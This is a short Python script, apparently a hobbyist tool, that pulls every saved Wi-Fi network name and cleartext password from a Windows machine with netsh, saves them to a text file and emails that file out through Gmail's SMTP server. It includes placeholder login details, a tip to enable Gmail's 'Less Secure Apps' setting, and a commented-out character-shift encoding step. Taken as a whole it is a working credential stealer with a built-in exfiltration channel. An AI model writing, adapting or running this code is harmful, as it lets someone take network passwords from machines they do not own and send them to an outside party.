# -*- coding: utf-8 -*-
"""
Created on Tue Jan 21 11:02:46 2020

@author: Orlando
@description: Script to find stored wifi passwords on running machine
"""

import subprocess
#import smtplib
###############################################################################
#                        Getting Wifi Passwords
###############################################################################

data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')

profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]

f_input = open("passwords.txt", "w") #File to store password onto

print("Getting Passwords!")

for i in profiles:
    results = subprocess.check_output(['netsh','wlan','show','profile',i,'key=clear']).decode('utf-8').split('\n')
    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
    
    try:
        f_input.write("{:<30}| {:<}".format(i, results[0]) + "\n")
    except IndexError:
        f_input.write("{:<30}| {:<}".format(i, "") + "\n")

f_input.close()
print("Done!")

###############################################################################
#                        Sending Myself the Passwords
###############################################################################
'''
In order for smtplib to work the setting Less Secure Apps in google must be 
turned on.
'''
#Your Gmail account
import smtplib
 
#SMTP session for Gmail
s = smtplib.SMTP('smtp.gmail.com', 587)
 
#Start TLS for security
s.starttls()
 
#Your Gmail authentication
s.login("myEmail@gamil.com", "myEmailPassword")
 
#Message to be sent
message = open("passwords.txt", "r").read()

'''
enc = open("passwords.txt", "r").read()
 
for i in range(0, len(enc)):
    message = message + chr(ord(enc[i]) - 4)
print(message)
'''

#Send the mail
s.sendmail("myEmail@gmail.com", "recipientEmail@gmail.com", message)
 
#Terminate
s.quit()


input("")
